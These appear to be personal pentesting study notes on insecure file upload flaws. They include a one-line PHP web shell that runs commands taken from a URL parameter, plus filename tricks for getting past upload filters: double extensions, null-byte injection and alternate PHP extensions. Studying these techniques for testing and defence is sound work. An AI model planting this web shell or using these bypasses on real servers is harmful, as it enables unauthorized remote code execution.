>[!question] What is Insecure File Upload ?__?
Insecure File Upload vulnerability is when an application allows uncontrolled and unvalidated upload of files. An attacker can exploit this vulnerability to upload malicious files, like web shells, which can lead to code execution, data leakage, or other types of attacks.

We can use dev tools or Burp Suite as per the methodology we follow.

We  can see if there's any check's happening on the Client Side or Server Side.

Take input from the url paramter. shell.php?cmd=whoami
<?php system($_GET['cmd']); ?>

>[!important] Exploitations: 

Bypass extension filters
Note: req server misconfigure to execute or the ability to rename once it's up
shell.php.jpg

Works in OLD Servers Null byte injection
shell.php%00.jpg
%00 is called the null byte and this terminates so when the web server calls it
interprets this differently.

Magic Bytes (i.e. Magic Bytes are the first few bytes of a file which tell the system what type of file it is)

Blocklist bypass
shell.php5
shell.phtml

>[!warning] So don't ever use block list to prevent file uploads.
